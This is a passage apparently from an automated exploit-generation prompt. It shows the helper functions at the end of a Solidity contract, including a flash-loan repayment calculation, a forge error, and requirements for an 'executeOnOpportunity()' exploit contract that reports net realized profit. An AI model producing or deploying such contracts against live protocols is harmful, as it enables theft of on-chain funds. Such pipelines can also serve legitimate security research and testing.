        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20Like.balanceOf.selector, account));
        if (ok && data.length >= 32) {
            value = abi.decode(data, (uint256));
        }
    }

    function _readUint(address target, bytes4 selector) internal view returns (uint256 value) {
        (bool ok, bytes memory data) = target.staticcall(abi.encodeWithSelector(selector));
        if (ok && data.length >= 32) {
            value = abi.decode(data, (uint256));
        }
    }

    function _callSucceeded(bool ok, bytes memory ret) internal pure returns (bool) {
        return ok && (ret.length == 0 || abi.decode(ret, (bool)));
    }

    function _hasCode(address account) internal view returns (bool) {
        return account.code.length != 0;
    }

    function _flashRepayAmount(uint256 borrowed) internal pure returns (uint256) {
        return ((borrowed * 1000) / 997) + 1;
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code does not cover paths indexes: 3
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
